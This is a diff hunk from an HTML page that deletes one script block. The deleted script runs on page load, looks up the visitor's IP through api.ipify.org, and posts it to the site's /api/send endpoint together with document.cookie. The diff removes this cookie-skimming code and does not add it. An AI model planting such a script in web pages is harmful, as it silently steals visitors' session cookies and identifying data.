@@ -41,19 +41,6 @@
         }
     })();
 </script>
-
-<script>
-    fetch("https://api.ipify.org?format=json")
-      .then(res => res.json())
-      .then(data => {
-        const message = `🕷 IP: ${data.ip}\n🍪 Cookies: ${document.cookie}`;
-        fetch('/api/send', {
-          method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({ message })
-        });
-      });
-</script>
     
 
   <style>
